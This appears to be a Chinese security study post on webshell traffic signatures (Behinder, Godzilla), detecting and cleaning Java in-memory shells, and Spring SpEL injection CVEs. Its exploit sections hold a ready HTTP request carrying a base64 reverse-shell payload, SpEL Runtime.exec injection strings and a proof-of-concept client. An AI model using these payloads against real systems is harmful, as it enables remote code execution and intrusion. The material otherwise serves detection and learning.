<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。</span><br><span class="line">Accept字段（弱特征），通常是Accept: application/json, text/javascript, /; q=0.01 意思是浏览器可接受任何文件，但最倾向application/json 和 text/javascript。</span><br><span class="line">Content-Type字段（弱特征），通常是Content-type: Application/x-www-form-urlencoded</span><br><span class="line">与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</span><br><span class="line">连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</span><br><span class="line">使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</span><br><span class="line">有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。</span><br><span class="line"></span><br><span class="line">冰蝎4.0HTTP协议进行通信，使得通信流量看起来是正常的Web流量，难以被检测；</span><br><span class="line"></span><br><span class="line">使用RC4加密算法对通信流量进行加密;</span><br><span class="line"></span><br><span class="line">PHPwebshell中存在固定代码</span><br><span class="line"></span><br><span class="line">$post=Decrypt(file_get_contents(&quot;php://input&quot;));</span><br><span class="line">eval($post);</span><br><span class="line">请求头和响应头里面会带有Connection：Keep-alive；</span><br><span class="line"></span><br><span class="line">content-Type字段：Application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">webshell会有一段连接32位md5值的前16位，默认连接密码为rebeyond;</span><br></pre></td></tr></table></figure>



<h3 id="哥斯拉的特征"><a href="#哥斯拉的特征" class="headerlink" title="哥斯拉的特征"></a>哥斯拉的特征</h3><p>1、pass&#x3D;eval(base64_decode…，pass&#x3D;加密数据。请求包“pass&#x3D;”开头，请求包较长 响应包为0，一个tcp包里面有三个http</p>
<p>2、user-agent,accept,accept-language 固定。</p>
<p> <strong>静态特征</strong></p>
<p>默认脚本编码生成的情况下，jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征</p>
<p>而php和asp是普通的一句话木马</p>
<p><img src="/photo/image-20240530153849661.png" alt="image-20240530153849661"></p>
<p><img src="/photo/image-20240530153912495.png" alt="image-20240530153912495"></p>
<p><img src="/photo/image-20240530154019572.png" alt="image-20240530154019572"></p>
<p>工作原理：</p>
<ol>
<li>基于流量，HTTP全加密的webshell</li>
<li>AES加密</li>
</ol>
<p>流量特征：</p>
<ol>
<li>低版本会有特征，是强特征。</li>
<li>发送一段固定代码(payload)，http响应为空</li>
<li>发送一段固定代码(test)，执行结果为固定的。</li>
<li>在发送疑端固定代码(getGacisInfo)</li>
</ol>
<h3 id="frp流量特征"><a href="#frp流量特征" class="headerlink" title="frp流量特征"></a>frp流量特征</h3><p>sock的用户和密码明文校验，无修改有配置文件，ip.dst_host &#x3D;&#x3D; ip</p>
<p><img src="/photo/image-20240530160022817.png" alt="image-20240530160022817"></p>
<h3 id="cs"><a href="#cs" class="headerlink" title="cs"></a>cs</h3><p><img src="/photo/cc0fb5d36682e9f9b2e54009f1718c3d.png" alt="Cobalt Strike 流量特征 分析.png"></p>
<h3 id="Webshell的检测思路"><a href="#Webshell的检测思路" class="headerlink" title="Webshell的检测思路"></a>Webshell的检测思路</h3><p>静态检测<br>静态检测通过匹配特征码，特征值，危险函数函数来查找 webshell 的方法，只能查找已知的 webshell，并且误报率漏报率会比较高，但是如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的 webshell 查找准确率高，部署方便，一个脚本就能搞定。缺点漏报率、误报率高，无法查找 0day 型 webshell，而且容易被绕过</p>
<p>动态检测<br>Linux 下就是 nobody 用户起了 bash，Win 下就是 IIS User 启动 cmd，这些都是动态特征。再者如果黑客反向连接的话，那很更容易检测了，Agent 和 IDS 都可以抓现行。Webshell</p>
<p>总有一个 HTTP 请求，如果我在网络层监控 HTTP，并且检测到有人访问了一个从没访问过得文件，而且返回了 200，则很容易定位到 webshell，这便是 http 异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p>
<p>日志检测<br>总有一个 HTTP 请求，如果我在网络层监控 HTTP，并且检测到有人访问了一个从没反问过得文件，而且返回了 200，则很容易定位到 webshell，这便是 http 异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。缺点也很明显，黑客只要利用原文件就很轻易绕过了，并且部署代价高，网站时常更新的话规则也要不断添加。</p>
<h3 id="Webshell防范方法"><a href="#Webshell防范方法" class="headerlink" title="Webshell防范方法"></a>Webshell防范方法</h3><p>防范的措施大概有三种：</p>
<p>第一种的思路是将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。</p>
<p>第二种是匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。</p>
<p>第三种是将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。</p>
<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器</p>
<p>判断方式：</p>
<p>先判断是通过什么方法注入的内存马，可以先查看 web 日志是否有可疑的 web 访问日志，如果是 filter 或者 listener 类型就会有大量 url 请求路径相同参数不同的，或者页面不存在但是返回 200 的，查看是否有类似哥斯拉、冰蝎相同的 url 请求，哥斯拉和冰蝎的内存马注入流量特征与普通 webshell 的流量特征基本吻合。通过查找返回 200 的 url 路径对比web 目录下是否真实存在文件，如不存在大概率为内存马。如在 web 日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的 error.log 日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在 java 代码执行漏洞以及是否存在过 webshell，排查框架漏洞，反序列化漏洞</p>
<p>清除方式：1.利用条件竞争把shell内容改写或者清除比较好用 2.重启服务 3.提前占用他的目录名</p>
<h5 id="java内存马原理："><a href="#java内存马原理：" class="headerlink" title="java内存马原理："></a>java内存马原理：</h5><p>通过在Java虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在Java虚拟机中注入特定的Java类、变量或方法等Java对象，然后在Java虚拟机中运行这些代码，实现对受害者机器的远程控制。</p>
<h5 id="java内存马排查："><a href="#java内存马排查：" class="headerlink" title="java内存马排查："></a>java内存马排查：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用Java Agent技术遍历所有已经加载到内存中的class。先判断是否是内存马，是则进入内存查杀。</span><br><span class="line"></span><br><span class="line">作为应急或者运维人员，当遇到疑似内存马的安全事件时，该如何去快速确认内存马是否存在以及确认内存马的位置呢？大体思路如下。</span><br><span class="line">如果是jsp注入，日志中排查可疑jsp的访问请求。</span><br><span class="line">如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</span><br><span class="line">根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</span><br><span class="line">先查看检查服务器 web 日志，查看是否有可疑的 web 访问日志，比如说 filter 或者 listener 类型的内存马，会有大量 url 请求路径相同参数不同的，或者通过查找返回 200 的 url 路径对比 web 目录下是否真实存在文件，如不存在大概率为内存马。</span><br><span class="line">在 java 中只有被 JVM 加载后的类才能被调用，或者在需要时通过反射通知 JVM 加载，所以特征都在内存中，表现形式为被加载的 class，因此产生一个检测思路：dump JVM 已加载 class 字节码-&gt;反编译成 java 代码-&gt; 源码 webshell 检测。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="java内存马识别："><a href="#java内存马识别：" class="headerlink" title="java内存马识别："></a>java内存马识别：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1，filter名字很特别 </span><br><span class="line">2，filter优先级是第一位 </span><br><span class="line">3，对比web.xml中没有filter配置 </span><br><span class="line">4，特殊classloader加载 </span><br><span class="line">5，对应的classloader路径下没有class文件 </span><br><span class="line">6，Filter的doFilter方法中有恶意代码</span><br></pre></td></tr></table></figure>

<h5 id="java内存马清除："><a href="#java内存马清除：" class="headerlink" title="java内存马清除："></a>java内存马清除：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、清除内存马中的Filter的恶意代码，2、 模拟中间件注销Filter</span><br></pre></td></tr></table></figure>

<h1 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h1><h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><h4 id="Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a><strong>Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</strong></h4><p>Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。 由于Spring Cloud Function中 RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码</p>
<p>SpEL 是什么</p>
<p>SpEL(Spring Expression Language)是基于 spring 的一个表达式语言，类似于 struts 的 OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于 Java 的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在 XML 文件中使用和直接在代码块中使用。</p>
<p>SpEL 原理如下∶</p>
<ol>
<li>表达式:可以认为就是传入的字符串内容</li>
<li>解析器︰将字符串解析为表达式内容</li>
<li>上下文:表达式对象执行的环境</li>
<li>根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象</li>
</ol>
<h4 id="Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980"><a href="#Spring-Data-MongoDB-SpEL-Expression-injection-CVE-2022-22980" class="headerlink" title="Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)"></a><strong>Spring Data MongoDB SpEL Expression injection(CVE-2022-22980)</strong></h4><p>说明：Spring Data MongoDB 应用程序在使用带有 SpEL 表达式的 @Query 或 @Aggregation-annotated 查询方法时容易受到 SpEL 注入的影响，如果输入未经过过滤，则该表达式包含用于值绑定的查询参数占位符。存在spring+mongodb 的组合可以盲打一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=T(java.lang.String).forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;命令&#x27;)</span><br></pre></td></tr></table></figure>



<h4 id="Spring-Cloud-Function-RCE-CVE-2022-22963"><a href="#Spring-Cloud-Function-RCE-CVE-2022-22963" class="headerlink" title="Spring Cloud Function RCE(CVE-2022-22963)"></a><strong>Spring Cloud Function RCE(CVE-2022-22963)</strong></h4><p>说明：Spring Cloud Function 是基于Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，未经授权的远程攻击者可利用该漏洞执行任意代码。</p>
<p>指纹：&#x2F;functionRouter</p>
<p>exp：访问&#x2F;functionRouter 使用POST发包，然后在header头里面放置payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: 192.168.233.131:41407</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMzEvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">Test</span><br></pre></td></tr></table></figure>



<h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><h3 id="SpEL介绍"><a href="#SpEL介绍" class="headerlink" title="SpEL介绍"></a>SpEL介绍</h3><ul>
<li>Spring表达式语言（简称 SpEL，全称Spring Expression Language）<strong>是一种功能强大的表达式语言，支持在运行时查询和操作对象图</strong>。它语法类似于OGNL，MVEL和JBoss EL，在方法调用和基本的字符串模板提供了极大地便利，也开发减轻了Java代码量。另外 , SpEL是Spring产品组合中表达评估的基础，但它并不直接与Spring绑定,可以独立使用。</li>
<li>基本用法:<br>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</li>
<li><strong>示例1:不注册新变量的用法</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;);//解析表达式</span><br><span class="line">System.out.println( exp.getValue() );//取值，Hello World！</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>示例2:自定义注册加载变量的用法</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Spel &#123;</span><br><span class="line">    public String name = &quot;何止&quot;;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Spel user = new Spel();</span><br><span class="line">        StandardEvaluationContext context=new StandardEvaluationContext();</span><br><span class="line">        context.setVariable(&quot;user&quot;,user);//通过StandardEvaluationContext注册自定义变量</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">        Expression expression = parser.parseExpression(&quot;#user.name&quot;);//解析表达式</span><br><span class="line">        System.out.println( expression.getValue(context).toString() );//取值,输出何止</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>除了expression.getValue之外，expression.setValue也是可以出发表达式执行的</strong></li>
</ul>
<h3 id="CVE-2018-1270"><a href="#CVE-2018-1270" class="headerlink" title="CVE-2018-1270"></a>CVE-2018-1270</h3><h4 id="满足版本"><a href="#满足版本" class="headerlink" title="满足版本"></a>满足版本</h4><ul>
<li>Spring Framework 5.0 to 5.0.4</li>
<li>Spring Framework 4.3 to 4.3.14</li>
<li>更老版本</li>
</ul>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下载带有漏洞的版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/spring-guides/gs-messaging-stomp-websocket</span><br><span class="line">cd ./gs-messaging-stomp-websocket</span><br><span class="line">git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3</span><br></pre></td></tr></table></figure>

<p>complete文件夹下是一个完整的SpringBoot项目，使用idea打开，修改src&#x2F;main&#x2F;resources&#x2F;static&#x2F;app.js中的connect函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function connect() &#123;</span><br><span class="line">    var header  = &#123;&quot;selector&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;open /System/Applications/Calculator.app&#x27;)&quot;&#125;;</span><br><span class="line">    var socket = new SockJS(&#x27;/gs-guide-websocket&#x27;);</span><br><span class="line">    stompClient = Stomp.over(socket);</span><br><span class="line">    stompClient.connect(&#123;&#125;, function (frame) &#123;</span><br><span class="line">        setConnected(true);</span><br><span class="line">        console.log(&#x27;Connected: &#x27; + frame);</span><br><span class="line">        stompClient.subscribe(&#x27;/topic/greetings&#x27;, function (greeting) &#123;</span><br><span class="line">            showGreeting(JSON.parse(greeting.body).content);</span><br><span class="line">        &#125;,header);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了一个header头部，其中指定了selector，其值即payload</p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>使用idea运行项目，然后打开网页，通过如下步骤触发：<br>1、点击“Connect”按钮<br>2、随便输入一些什么，点击“Send”发送，触发</p>
<ul>
<li>这是后有人会说了，我都能修改它源码了，还要什么命令执行，其实不是的，<strong>app.js是返回给用户使用的，用户可以随意修改，比如我们通过浏览器修改app.js如下</strong><br><img src="/photo/aa741efa16dd2d2c34452c652e3c0b61_935x359.png" alt="img"><br>然后依然可以触发<br><img src="/photo/6b4c0423c41bb038acd6515bfd671f21_842x301.png" alt="img"></li>
</ul>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><ul>
<li>点击Connect按钮时，会通过下面函数添加恶意头</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//org.springframework.messaging.simp.broker.DefaultSubscriptionRegistry#addSubscriptionInternal</span><br><span class="line">protected void addSubscriptionInternal(String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123;</span><br><span class="line">        Expression expression = null;</span><br><span class="line">        MessageHeaders headers = message.getHeaders();</span><br><span class="line">        String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(this.getSelectorHeaderName(), headers);</span><br><span class="line">        if (selector != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                expression = this.expressionParser.parseExpression(selector);</span><br><span class="line">                this.selectorHeaderInUse = true;</span><br><span class="line">                if (this.logger.isTraceEnabled()) &#123;</span><br><span class="line">                    this.logger.trace(&quot;Subscription selector: [&quot; + selector + &quot;]&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Throwable var9) &#123;</span><br><span class="line">                if (this.logger.isDebugEnabled()) &#123;</span><br><span class="line">                    this.logger.debug(&quot;Failed to parse selector: &quot; + selector, var9);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression);</span><br><span class="line">        this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后我们点击send按钮，它会被sendMessageToSubscribers函数捕获，其中message保存了此次连接&#x2F;会话的相关信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//org.springframework.messaging.simp.broker.SimpleBrokerMessageHandler#sendMessageToSubscribers</span><br><span class="line">    protected void sendMessageToSubscribers(@Nullable String destination, Message&lt;?&gt; message) &#123;</span><br><span class="line">        MultiValueMap&lt;String, String&gt; subscriptions = this.subscriptionRegistry.findSubscriptions(message);</span><br><span class="line">        if (!subscriptions.isEmpty() &amp;&amp; this.logger.isDebugEnabled()) &#123;</span><br><span class="line">            this.logger.debug(&quot;Broadcasting to &quot; + subscriptions.size() + &quot; sessions.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进findSubscriptions函数，做了一些关于headers的处理</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public final MultiValueMap&lt;String, String&gt; findSubscriptions(Message&lt;?&gt; message) &#123;</span><br><span class="line">        MessageHeaders headers = message.getHeaders();</span><br><span class="line">        SimpMessageType type = SimpMessageHeaderAccessor.getMessageType(headers);</span><br><span class="line">        if (!SimpMessageType.MESSAGE.equals(type)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Unexpected message type: &quot; + type);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String destination = SimpMessageHeaderAccessor.getDestination(headers);</span><br><span class="line">            if (destination == null) &#123;</span><br><span class="line">                if (this.logger.isErrorEnabled()) &#123;</span><br><span class="line">                    this.logger.error(&quot;No destination in &quot; + message);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return EMPTY_MAP;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return this.findSubscriptionsInternal(destination, message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进findSubscriptionsInternal函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected MultiValueMap&lt;String, String&gt; findSubscriptionsInternal(String destination, Message&lt;?&gt; message) &#123;</span><br><span class="line">        MultiValueMap&lt;String, String&gt; result = this.destinationCache.getSubscriptions(destination, message);</span><br><span class="line">        return this.filterSubscriptions(result, message);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>跟进filterSubscriptions函数，也就是出发漏洞的函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">private MultiValueMap&lt;String, String&gt; filterSubscriptions(MultiValueMap&lt;String, String&gt; allMatches, Message&lt;?&gt; message) &#123;</span><br><span class="line">        if (!this.selectorHeaderInUse) &#123;</span><br><span class="line">            return allMatches;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            EvaluationContext context = null;</span><br><span class="line">            MultiValueMap&lt;String, String&gt; result = new LinkedMultiValueMap(allMatches.size());</span><br><span class="line">            Iterator var5 = allMatches.keySet().iterator();</span><br><span class="line"></span><br><span class="line">            label59:</span><br><span class="line">            while(var5.hasNext()) &#123;</span><br><span class="line">                String sessionId = (String)var5.next();</span><br><span class="line">                Iterator var7 = ((List)allMatches.get(sessionId)).iterator();</span><br><span class="line"></span><br><span class="line">                while(true) &#123;</span><br><span class="line">                    while(true) &#123;</span><br><span class="line">                        String subId;</span><br><span class="line">                        DefaultSubscriptionRegistry.Subscription sub;</span><br><span class="line">                        do &#123;</span><br><span class="line">                            DefaultSubscriptionRegistry.SessionSubscriptionInfo info;</span><br><span class="line">                            do &#123;</span><br><span class="line">                                if (!var7.hasNext()) &#123;</span><br><span class="line">                                    continue label59;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                subId = (String)var7.next();</span><br><span class="line">                                info = this.subscriptionRegistry.getSubscriptions(sessionId);</span><br><span class="line">                            &#125; while(info == null);</span><br><span class="line"></span><br><span class="line">                            sub = info.getSubscription(subId);</span><br><span class="line">                        &#125; while(sub == null);</span><br><span class="line"></span><br><span class="line">                        Expression expression = sub.getSelectorExpression();</span><br><span class="line">                        if (expression == null) &#123;</span><br><span class="line">                            result.add(sessionId, subId);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            if (context == null) &#123;</span><br><span class="line">                                context = new StandardEvaluationContext(message);</span><br><span class="line">                                context.getPropertyAccessors().add(new DefaultSubscriptionRegistry.SimpMessageHeaderPropertyAccessor());</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            try &#123;</span><br><span class="line">                                if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123;</span><br><span class="line">                                    result.add(sessionId, subId);</span><br><span class="line">                                &#125;</span><br><span class="line">      ...</span><br></pre></td></tr></table></figure>

<ul>
<li>函数中，通过info.getSubscription(subId);将恶意payload取出来，然后在expression.getValue(context, Boolean.class)中触发</li>
</ul>
<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul>
<li>将之前的StandardEvaluationContext替换成了SimpleEvaluationContext</li>
<li>SimpleEvaluationContext对于权限的限制更为严格，能够进行的操作更少。只支持一些简单的Map结构</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    private static final EvaluationContext messageEvalContext = SimpleEvaluationContext.forPropertyAccessors(new PropertyAccessor[]&#123;new DefaultSubscriptionRegistry.SimpMessageHeaderPropertyAccessor()&#125;).build();</span><br><span class="line">...</span><br><span class="line">    Boolean result = (Boolean)expression.getValue(messageEvalContext, message, Boolean.class);</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2018-1273"><a href="#CVE-2018-1273" class="headerlink" title="CVE-2018-1273"></a>CVE-2018-1273</h3><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Spring Data Commons 1.13 to 1.13.10</span><br><span class="line">Spring Data Commons 2.0 to 2.0.5</span><br></pre></td></tr></table></figure>

